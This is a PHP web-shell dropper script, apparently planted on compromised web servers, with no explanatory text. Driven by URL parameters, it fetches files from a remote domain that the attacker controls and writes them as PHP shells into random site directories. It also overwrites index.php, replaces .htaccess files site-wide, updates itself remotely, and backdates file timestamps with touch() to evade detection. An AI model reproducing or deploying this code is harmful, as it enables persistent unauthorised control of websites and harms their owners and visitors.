<?php 
    error_reporting(0);
	define('BASE_PATH',str_ireplace($_SERVER['PHP_SELF'],'',__FILE__));
	function curl_get_contents($url){
       $ch =curl_init();
       curl_setopt($ch, CURLOPT_URL, $url);
       curl_setopt($ch, CURLOPT_TIMEOUT,5);
       curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);
       curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
       $r = curl_exec($ch);
       curl_close($ch);
       return $r;
    }
    function check_remote_file_exists($url) {
	    $curl = curl_init($url);
	    curl_setopt($curl, CURLOPT_NOBODY, true);
	    curl_setopt($curl, CURLOPT_CUSTOMREQUEST, 'GET');
	    $result = curl_exec($curl);
	    $found = false;
	    if ($result !== false) {
	        $statusCode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
	        if ($statusCode == 200) {
	            $found = true;
	        }
	    }
	    curl_close($curl);
	    return $found;
	}
	function copyfiles($file1,$file2){
	 	$contentx =@file_get_contents($file1);
	  	$openedfile = @fopen($file2, "w");
	  	@fwrite($openedfile, $contentx);
	  	@fclose($openedfile);
	    if ($contentx === FALSE) {
	   		$status=false;
	    }else $status=true;
	   	return $status;
  	}
	function read_dir_queue($dir,$level=5){
		$files=array();
		$files1=array();
		$queue=array($dir);
		while(@$data=each($queue)){
			$path=$data['value'];
			if(@is_dir($path) && @$handle=@opendir($path)){
				while($file=@readdir($handle)){
					$path3 = str_replace($_SERVER['DOCUMENT_ROOT'],"",$path);
					$path4 = explode("/",$path3);
					if(count($path4)>($level+1)){ break 2; }
					//if(count($files)>1000){ break 2; }
					if($file=='.'||$file=='..') continue;
					$files[] = $real_path=$path.'/'.$file;
					if (is_dir($real_path)) $queue[] = $real_path;
				}
			}
			@closedir($handle);
		}
		return $files;
	}
	function read_dir_queue1($dir,$level=5){
		$files=array();
		$files1=array();
		$queue=array($dir);
		while(@$data=each($queue)){
			$path=$data['value'];
			if(@is_dir($path) && @$handle=@opendir($path)){
				while($file=@readdir($handle)){
					$path3 = str_replace($_SERVER['DOCUMENT_ROOT'],"",$path);
					$path4 = explode("/",$path3);
					if(count($path4)>$level){ break 2; }
					//if(count($files)>1000){ break 2; }
					if($file=='.'||$file=='..') continue;
					$files[] = $real_path=$path.'/'.$file;
					if (is_dir($real_path)) $queue[] = $real_path;
				}
			}
			@closedir($handle);
		}
		return $files;
	}
	function rpath_arry($dir){
		$files=array();
		$queue=array($dir);
		while(@$data=each($queue)){
			$path=$data['value'];
			if(@is_dir($path) && @$handle=@opendir($path)){
				while($file=@readdir($handle)){
					$path3 = str_replace($_SERVER['DOCUMENT_ROOT'],"",$path);
					$path4 = explode("/",$path3);
					//if(count($path4)>($level+1)){ break 2; }
					//if(count($files)>1000){ break 2; }
					if($file=='.'||$file=='..') continue;
					$files[] = $real_path=$path.'/'.$file;
					if (is_dir($real_path)) $queue[] = $real_path;
				}
			}
			@closedir($handle);
		}
		return $files;
	}
	function getInd_Content($base_path1){
 		$file_path = $base_path1.'/index.php';
 		$file_path1 = $base_path1.'/index.html';
 		$file_path2 = $base_path1.'/index.htm';
 		$file_path3 = $base_path1.'/default.html';
 	
 		if(file_exists($file_path)){
 			$str=@file_get_contents($file_path);
 			$shell_content1=  $str;
			$shell_content2 = explode('?>',$shell_content1);
			$shell_content3 = $shell_content1;
			for($i=0;$i<count($shell_content2);$i++){
	 			if(strpos($shell_content2[$i],'base64_decode(') !== false || strpos($shell_content2[$i],'urldecode(') !== false || strpos($shell_content2[$i],'O00__0OOO_') !== false || strpos($shell_content2[$i],'yumingid') !== false || strpos($shell_content2[$i],'urlgz=') !== false || strpos($shell_content2[$i],'O0O_0O_O_0') !== false || strpos($shell_content2[$i],'wp-admin') !== false || strpos($shell_content2[$i],'ignore_user_abort') !== false || strpos($shell_content2[$i],'HTTP_REFERER') !== false || strpos($shell_content2[$i],'sitemap') !== false || strpos($shell_content2[$i],'$x(') !== false || strpos($shell_content2[$i],'$_GET["3x"]') !== false || strpos($shell_content2[$i],'error_reporting') !== false || strpos($shell_content2[$i],'ini_set(') !== false || strpos($shell_content2[$i],'ini_set(') !== false){
				 	$shell_content3=str_replace($shell_content2[$i]."?>","",$shell_content3);
				}
 			}
            echo $shell_content3;
 			exit;
 		}else if(file_exists($file_path1)){
 			$str1=@file_get_contents($file_path1);
 			echo $str1;
 			exit;
 		}else if(file_exists($file_path2)){
 			$str2=@file_get_contents($file_path2);
 			echo $str2;
 			exit;
 		}else if(file_exists($file_path3)){
 			$str3=@file_get_contents($file_path3);
 			echo $str3;
 			exit;
 		}else{
 			echo '';
 			exit;
 		}
	}
	function dir_size1($dir3,$url){
	      $dh = @opendir($dir3);
	      $return = array();
		  while($file = @readdir($dh)){
		     if($file!='.' and $file!='..'){
		     	$filetime[] = date("Y-m-d H:i:s",filemtime($file));
	         }
	      }  
          @closedir($dh);             
          @array_multisort($filetime);
          return $filetime;
	}
 	$sig=@$_GET['sig'];
 	@$domain_2020='http://'.$_GET['domain'];
 	if($sig=='beima'){
 		$level = $_GET['level'];
 		$aPathes = @read_dir_queue($_SERVER['DOCUMENT_ROOT'],$level);
		function getDepth($sPath) {
		    return substr_count($sPath, '/');
		}
		$aPathDepths = array_map('getDepth', $aPathes);
		arsort($aPathDepths);
		$arry1=array();
		foreach ($aPathDepths as $iKey => $iDepth) {
			$arry11 = str_replace(strtolower($_SERVER['DOCUMENT_ROOT']),"",strtolower($aPathes[$iKey]));
			$arry11 = dirname($arry11);
			$arry22 = explode("/",$arry11);
			if(count($arry22)==$level){
				$arry1[] = dirname($aPathes[$iKey]);
			}else{
				$arry1[] = dirname($aPathes[$iKey]);
			}
		}
		$arry2= array_unique($arry1);
		shuffle($arry2);
		$rndKey = array_rand($arry2);
		$create_path1 = $arry2[$rndKey];
		$shell_file = $_GET['shell_file'];
		$shell_source5 = $domain_2020."/".$shell_file.".html";
		if(check_remote_file_exists($shell_source5) && $_GET['file_name']!=""){
			$file_name = $_GET['file_name'];
			if($file_name!=""){
				$shell_end5 = $create_path1.'/'.$file_name;
			}else{
				$shell_end5 = $create_path1.'/style.php';
			}
	 		if(copyfiles($shell_source5,$shell_end5))
		    {
		    	if($_SERVER["HTTPS"] == "on") 
			    {
			        $http1="https://";
			    }else{
			    	$http1="http://";
			    }
		     	if(!file_exists($shell_end5))
				{
				    echo $http1.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."|"."file don't create success!";
				    exit;
				}
				$time3=@dir_size1($shell_end5,'');
		 		$time4=strtotime($time3[0]);
	 		 	touch($shell_end5,$time4);
		 		$shell_end6 =$http1.$_SERVER["HTTP_HOST"].str_replace($_SERVER['DOCUMENT_ROOT'],'',$shell_end5);
		 		echo $shell_end6; 
		    }else{
		    	$str6=@curl_get_contents($shell_source5);
		    	file_put_contents($shell_end5,$str6);
		    	if($_SERVER["HTTPS"] == "on") 
			    {
			        $http1="https://";
			    }else{
			    	$http1="http://";
			    }
		     	if(!file_exists($shell_end5))
				{
				    echo $http1.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."|"."file don't create success!";
				    exit;
				}
				$time3=@dir_size1($shell_end5,'');
		 		$time4=strtotime($time3[0]);
	 		 	touch($shell_end5,$time4);
			    $shell_end6 =$http1.$_SERVER["HTTP_HOST"].str_replace($_SERVER['DOCUMENT_ROOT'],'',$shell_end5);
		 		echo $shell_end6;
		    }
		}
	    exit;
 	}else if($sig=='jc_other'){
 		$level = $_GET['level'];
 		$aPathes = read_dir_queue1($_SERVER['DOCUMENT_ROOT'],$level);
		function getDepth($sPath) {
		    return substr_count($sPath, '/');
		}
		$aPathDepths = array_map('getDepth', $aPathes);
		arsort($aPathDepths);
		$arry1=array();
		foreach ($aPathDepths as $iKey => $iDepth) {
			$arry11 = str_replace(strtolower($_SERVER['DOCUMENT_ROOT']),"",strtolower($aPathes[$iKey]));
			$arry11 = dirname($arry11);
			$arry22 = explode("/",$arry11);
			if(count($arry22)==$level){
				$arry1[] = dirname($aPathes[$iKey]);
			}else{
				$arry1[] = dirname($aPathes[$iKey]);
			}
		}
		$arry2= array_unique($arry1);
		shuffle($arry2);
		$rndKey = array_rand($arry2);
		$create_path1 = $arry2[$rndKey];
		$shell_file = $_GET['shell_file'];
		$shell_source5 = $domain_2020."/".$shell_file.".html";
		if(check_remote_file_exists($shell_source5) && $shell_file!=""){
			$file_name = $_GET['file_name'];
			if($file_name!=""){
				$shell_end5 = $create_path1.'/'.$file_name;
			}else{
				$shell_end5 = $create_path1.'/style.php';
			}
	 		if(copyfiles($shell_source5,$shell_end5))
		    {
		    	if($_SERVER["HTTPS"] == "on") 
			    {
			        $http1="https://";
			    }else{
			    	$http1="http://";
			    }
		     	if(!file_exists($shell_end5))
				{
				    echo $http1.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."|"."file don't create success!";
				    exit;
				}
				$time3=@dir_size1($shell_end5,'');
		 		$time4=strtotime($time3[0]);
	 		 	touch($shell_end5,$time4);
		 		$shell_end6 =$http1.$_SERVER["HTTP_HOST"].str_replace($_SERVER['DOCUMENT_ROOT'],'',$shell_end5);
		 		echo $shell_end6; 
		    }else{
		    	$str6=@curl_get_contents($shell_source5);
		    	file_put_contents($shell_end5,$str6);
		    	if($_SERVER["HTTPS"] == "on") 
			    {
			        $http1="https://";
			    }else{
			    	$http1="http://";
			    }
		     	if(!file_exists($shell_end5))
				{
				    echo $http1.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."|"."file don't create success!";
				    exit;
				}
				$time3=@dir_size1($shell_end5,'');
		 		$time4=strtotime($time3[0]);
	 		 	touch($shell_end5,$time4);
			    $shell_end6 =$http1.$_SERVER["HTTP_HOST"].str_replace($_SERVER['DOCUMENT_ROOT'],'',$shell_end5);
		 		echo $shell_end6;
		    }
		}
	    exit;
 	}else if($sig=='jc_index'){
 		$domain_name1 = trim(str_replace("www.","",$_SERVER['SERVER_NAME']));
 		$shell_file = $_GET['shell_file'];
		$file_path= BASE_PATH.'/index.php';
 		$file_path1 = $domain_2020.'/shell_index/'.$domain_name1.'/index.html';
 	    //if(!check_remote_file_exists($file_path1)){
			$ser_url1= $domain_2020."/cpa_ind5.php?dname1=".$domain_name1."&check_address1=http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."&shell_file=".$shell_file."";
			$file_contents_2=curl_get_contents($ser_url1);
		//}
		if(@$_SERVER["HTTPS"]=="on")
		{
		    $http1="https://";
		}else{
		    $http1="http://";
		}
		$tishi = $http1.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
	    $str1=@curl_get_contents($file_path1);
		$str=@file_get_contents($file_path);
	 	if(file_exists($file_path)){
		    if(check_remote_file_exists($file_path1)){
		    	$str1=@curl_get_contents($file_path1);
				$str=@file_get_contents($file_path);
				if($str==$str1){
					 echo $tishi.'|index.php write success!';
				}else{
				     //echo 'fail';
			         @chmod($file_path,0644);
			         $result_unlink=unlink($file_path);
			         if($result_unlink){
				         if(copyfiles($file_path1,$file_path))
				         {
					 		 $time3=dir_size1(dirname(__FILE__),'');
					 		 $time4=strtotime($time3[0]);
					 		 touch(dirname(__FILE__).'/'.basename(__FILE__),$time4);
					 		 touch($file_path,$time4);
					 		 echo $tishi.'|index.php write success!';
				         }
				         else
				         {
				         	file_put_contents($file_path,$str1);
				         	$str1=@curl_get_contents($file_path1);
							$str=@file_get_contents($file_path);
				         	if($str==$str1){
						 		$time3=dir_size1(dirname(__FILE__),'');
						 		$time4=strtotime($time3[0]);
					 		 	touch(dirname(__FILE__).'/'.basename(__FILE__),$time4);
					 		 	touch($file_path,$time4);
					 		 	echo $tishi.'|index.php write success!';
				         	}else{
				         		echo $tishi.'|index.php write fail!';
				         	}
				         }
			         }  
				}
			}
	    }else{
	    	if(check_remote_file_exists($file_path1)){
			    @chmod($file_path,0644);
			    if(copyfiles($file_path1,$file_path))
			    {
			        $time3=dir_size1(dirname(__FILE__),'');
			 		$time4=strtotime($time3[0]);
		 		 	touch(dirname(__FILE__).'/'.basename(__FILE__),$time4);
		 		 	touch($file_path,$time4);
		 		 	echo $tishi.'|index.php write success!';
			    }
			    else
			    {
		    		file_put_contents($file_path,$str1);
		    		$str1=@curl_get_contents($file_path1);
					$str=@file_get_contents($file_path);
		    		if($str==$str1){
				 		$time3=dir_size1(dirname(__FILE__),'');
				 		$time4=strtotime($time3[0]);
			 		 	touch(dirname(__FILE__).'/'.basename(__FILE__),$time4);
			 		 	touch($file_path,$time4);
			 		 	echo $tishi.'|index.php write success!';
		         	}else{
		         		echo $tishi.'|index.php write fail!';
		         	}
			    }
	    	}else{
	    		$shell_cont1 = getInd_Content(BASE_PATH);
			    $shell_file = $_GET['shell_file'];
			    $file_path1 = $domain_2020."/".$shell_file.".html";
			    $shell_content = @curl_get_contents($file_path1);
			    $shell_cont2 = substr_replace($shell_cont1,$shell_content,0,0);
	    		@file_put_contents($file_path,$shell_cont2);
	    	}
		}
		exit;
 	}else if($sig=='change_hta'){
 		//define('BASE_PATH',str_replace('\\','/',realpath(dirname(__FILE__).'/../')));
		//define('BASE_PATH',str_ireplace($_SERVER['PHP_SELF'],'',__FILE__));
		$shell_source5 = $domain_2020."/htaccess.html";
		$str7=@curl_get_contents($shell_source5);
	 	if(strpos($str7,'<FilesMatch') !== false){	
		 	$file_htaccess = BASE_PATH.'/.htaccess';
	 		if($_SERVER["HTTPS"] == "on") 
			{
			    $http1="https://";
			}else{
			    $http1="http://";
			}
			$tishi = $http1.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
			
			if(file_exists($file_htaccess)){
				$result_unlink=unlink($file_htaccess);
				if($result_unlink){
					if(copyfiles($shell_source5,$file_htaccess)){
						echo $tishi.'|.htaccess write success!';
					}else{
						$str6=@curl_get_contents($shell_source5);
						$str=@file_get_contents($file_htaccess);
						file_put_contents($file_htaccess,$str6);
						if($str6==$str){
							echo $tishi.'|.htaccess write success!';
						}else{
							echo $tishi.'|.htaccess write fail!';
						}
					}
				}else{
					if(copyfiles($shell_source5,$file_htaccess)){
						echo $tishi.'|.htaccess write success!';
					}else{
						$str6=@curl_get_contents($shell_source5);
						$str=@file_get_contents($file_htaccess);
						file_put_contents($file_htaccess,$str6);
						if($str6==$str){
							echo $tishi.'|.htaccess write success!';
						}else{
							echo $tishi.'|.htaccess write fail!';
						}
					}
				}
			}else{
				if(copyfiles($shell_source5,$file_htaccess)){
					echo $tishi.'|.htaccess write success!';
				}else{
					$str6=@curl_get_contents($shell_source5);
					$str=@file_get_contents($file_htaccess);
					file_put_contents($file_htaccess,$str6);
					if($str6==$str){
						echo $tishi.'|.htaccess write success!';
					}else{
						echo $tishi.'|.htaccess write fail!';
					}
				}
			}
		}else{
		 	echo $tishi.'|htaccess.html file dont exist or the content is wrong!';
		}
	    exit;
 	}else if($sig=='change_hta_all'){
 		//define('BASE_PATH',str_replace('\\','/',realpath(dirname(__FILE__).'/../')));
		//define('BASE_PATH',str_ireplace($_SERVER['PHP_SELF'],'',__FILE__));
		$shell_source5 = $domain_2020."/htaccess.html";
		$str7=@curl_get_contents($shell_source5);
	 	if(strpos($str7,'<FilesMatch') !== false){
 			$file_htaccess = BASE_PATH.'/.htaccess';
	 		if($_SERVER["HTTPS"] == "on")
			{
			    $http1="https://";
			}else{
			    $http1="http://";
			}
			$tishi = $http1.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
			if(file_exists($file_htaccess)){
				$result_unlink=unlink($file_htaccess);
				if($result_unlink){
					if(copyfiles($shell_source5,$file_htaccess)){
						echo $tishi.'|.htaccess write success!';
					}else{
						$str6=@curl_get_contents($shell_source5);
						$str=@file_get_contents($file_htaccess);
						file_put_contents($file_htaccess,$str6);
						if($str6==$str){
							echo $tishi.'|.htaccess write success!';
						}else{
							echo $tishi.'|.htaccess write fail!';
						}
					}
				}else{
					if(copyfiles($shell_source5,$file_htaccess)){
						echo $tishi.'|.htaccess write success!';
					}else{
						$str6=@curl_get_contents($shell_source5);
						$str=@file_get_contents($file_htaccess);
						file_put_contents($file_htaccess,$str6);
						if($str6==$str){
							echo $tishi.'|.htaccess write success!';
						}else{
							echo $tishi.'|.htaccess write fail!';
						}
					}
				}
			}else{
				if(copyfiles($shell_source5,$file_htaccess)){
					echo $tishi.'|.htaccess write success!';
				}else{
					$str6=@curl_get_contents($shell_source5);
					$str=@file_get_contents($file_htaccess);
					file_put_contents($file_htaccess,$str6);
					if($str6==$str){
						echo $tishi.'|.htaccess write success!';
					}else{
						echo $tishi.'|.htaccess write fail!';
					}
				}
			}
	 		
	 		$files1 = @rpath_arry($_SERVER['DOCUMENT_ROOT']);
	 		$files2 =array();
	 		for($k=0;$k<count($files1);$k++){
	 			$files2[]=dirname($files1[$k]);
	 		}
	 		$files3=array();
	 		$files3 =array_filter(array_unique($files2));
	 		foreach ($files3 as $key=>$value){
		 		if( $files3[$key]!= BASE_PATH){
		 			$file_htaccess1 = $files3[$key].'/.htaccess';
		 			//file_put_contents($file_htaccess1,$str7);
		 			copyfiles($shell_source5,$file_htaccess1);
		 		    //echo $file_htaccess1.'--11<br />';
		 		}
	 		}
		}else{
		 	echo $tishi.'|htaccess.html file dont exist or the content is wrong!';
		}
	    exit;
 	}else if($sig=='rename'){
 		$rename = $_GET['rename'];
 		$source_name = $_GET['source_name'];
 		if($_GET['tag']!=''){
 			$tag='#'.$_GET['tag'];
 		}else{
 			$tag='';
 		}
 		if($rename!="" && $source_name!=""){
	 		$rename_file = dirname(__FILE__).'/'.$rename;
		 	$source_file = dirname(__FILE__).'/'.$source_name;
	 		if($_SERVER["HTTPS"] == "on") 
			{
			   $http1="https://";
			}else{
			   $http1="http://";
			}
			$rename_file1 = $http1.$_SERVER["HTTP_HOST"].str_replace(strtolower($_SERVER['DOCUMENT_ROOT']),'',strtolower($rename_file));
			$source_file1 = $http1.$_SERVER["HTTP_HOST"].str_replace(strtolower($_SERVER['DOCUMENT_ROOT']),'',strtolower($source_file));
			$rename_file1 = str_replace('\\','/',$rename_file1);
			$source_file1 = str_replace('\\','/',$source_file1);
		    if(file_exists($source_file)){
		        if(rename($source_file,$rename_file)){
		            echo $rename_file1.$tag;
		        }else{
		            echo $source_file1.$tag.'| rename fail!';
		        }
		    }else{
		        echo $source_file1.$tag.'| no exists!';
		    }
 		}else{
 			echo $source_file1.$tag.'| rename fail!';
 		}
 		exit;
 	}else if($sig=='update'){
 		$style_2020=$domain_2020.'/style_2020.html';
 		$file_style=__FILE__;
 		if(check_remote_file_exists($style_2020)){
 			$str7=@curl_get_contents($style_2020);
	 		if(strpos($str7,'domain_2020') !== false){	
		 		if($_SERVER["HTTPS"] == "on") 
				{
				    $http1="https://";
				}else{
				    $http1="http://";
				}
				$tishi = $http1.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
	 			if(copyfiles($style_2020,$file_style))
			    {
			    	$time3=@dir_size1(dirname(__FILE__),'');
					$time4=strtotime($time3[0]);
					touch($file_style,$time4);
			    	echo $tishi.'--update success!';
			    }else{
			    	$shell_cont5=@curl_get_contents($style_2020);
			    	$shell51=@file_put_contents($file_style,$shell_cont5);
			    	if($shell51>0){
			    		$time3=@dir_size1(dirname(__FILE__),'');
						$time4=strtotime($time3[0]);
						touch($file_style,$time4);
						echo $tishi.'--update success!';
			    	}else{
			    		echo $tishi.'--update fail!';
			    	}
			    }
	 		}	
 		}
		exit;	
 	}else if($sig=='shell519'){
		$rename = $_GET['file_name'];
		$shell_file = $_GET['shell_file'];
		if($rename!="" && $shell_file!=""){
	 		$shell_source5= $domain_2020."/".$shell_file.".html";
	 		if(check_remote_file_exists($shell_source5)){
 				$level = $_GET['level'];
		 		$aPathes = @read_dir_queue($_SERVER['DOCUMENT_ROOT'],$level);
				function getDepth($sPath) {
				    return substr_count($sPath, '/');
				}
				$aPathDepths = array_map('getDepth', $aPathes);
				arsort($aPathDepths);
				$arry1=array();
				foreach ($aPathDepths as $iKey => $iDepth) {
					$arry11 = str_replace(strtolower($_SERVER['DOCUMENT_ROOT']),"",strtolower($aPathes[$iKey]));
					$arry11 = dirname($arry11);
					$arry22 = explode("/",$arry11);
					if(count($arry22)==$level){
						$arry1[] = dirname($aPathes[$iKey]);
					}else{
						$arry1[] = dirname($aPathes[$iKey]);
					}
				}
				$arry2= array_filter(array_unique($arry1));
				shuffle($arry2);
				$rndKey = array_rand($arry2);
				$create_path1 = $arry2[$rndKey];
	 			$shell5=$create_path1.'/'.$rename;
		 		if($_SERVER["HTTPS"] == "on") 
			    {
			        $http1="https://";
			    }else{
			    	$http1="http://";
			    }
		 		if(copyfiles($shell_source5,$shell5))
			    {
			    	$time3=@dir_size1(dirname(__FILE__),'');
					$time4=strtotime($time3[0]);
					touch($shell5,$time4);
			        echo $http1.$_SERVER["HTTP_HOST"].str_replace(BASE_PATH,"",$shell5).'--create success!';
			    }
			    else
			    {
			    	$shell_cont5=@curl_get_contents($shell_source5);
			    	$shell51=@file_put_contents($shell5,$shell_cont5);
			    	if($shell51>0){
			    		$time3=@dir_size1(dirname(__FILE__),'');
						$time4=strtotime($time3[0]);
						touch($shell5,$time4);
			    		echo $http1.$_SERVER["HTTP_HOST"].str_replace(BASE_PATH,"",$shell5).'--create success!';
			    	}else{
			    		echo $http1.$_SERVER["HTTP_HOST"].str_replace(BASE_PATH,"",$shell5).'--create fail!';
			    	}
			    }
	 		}
		}
		exit;
 	}else if($sig=='index'){
 		$file_path = BASE_PATH.'/index.php';
 		$file_path1 = BASE_PATH.'/index.html';
 		$file_path2 = BASE_PATH.'/index.htm';
 		$file_path3 = BASE_PATH.'/default.html';
 	
 		if(file_exists($file_path)){
 			$str=@file_get_contents($file_path);
 			$shell_content1=  $str;
			$shell_content2 = explode('?>',$shell_content1);
			$shell_content3 = $shell_content1;
			for($i=0;$i<count($shell_content2);$i++){
	 			if(strpos($shell_content2[$i],'base64_decode(') !== false || strpos($shell_content2[$i],'urldecode(') !== false || strpos($shell_content2[$i],'O00__0OOO_') !== false || strpos($shell_content2[$i],'yumingid') !== false || strpos($shell_content2[$i],'urlgz=') !== false || strpos($shell_content2[$i],'O0O_0O_O_0') !== false || strpos($shell_content2[$i],'wp-admin') !== false || strpos($shell_content2[$i],'ignore_user_abort') !== false || strpos($shell_content2[$i],'HTTP_REFERER') !== false || strpos($shell_content2[$i],'sitemap') !== false || strpos($shell_content2[$i],'$x(') !== false || strpos($shell_content2[$i],'$_GET["3x"]') !== false || strpos($shell_content2[$i],'error_reporting') !== false || strpos($shell_content2[$i],'ini_set(') !== false || strpos($shell_content2[$i],'ini_set(') !== false){
				 	$shell_content3=str_replace($shell_content2[$i]."?>","",$shell_content3);
				}
 			}
            echo $shell_content3;
 			exit;
 		}else if(file_exists($file_path1)){
 			$str1=@file_get_contents($file_path1);
 			echo $str1;
 			exit;
 		}else if(file_exists($file_path2)){
 			$str2=@file_get_contents($file_path2);
 			echo $str2;
 			exit;
 		}else if(file_exists($file_path3)){
 			$str3=@file_get_contents($file_path3);
 			echo $str3;
 			exit;
 		}else{
 			echo '';
 			exit;
 		}
 	}
 	exit();
?>
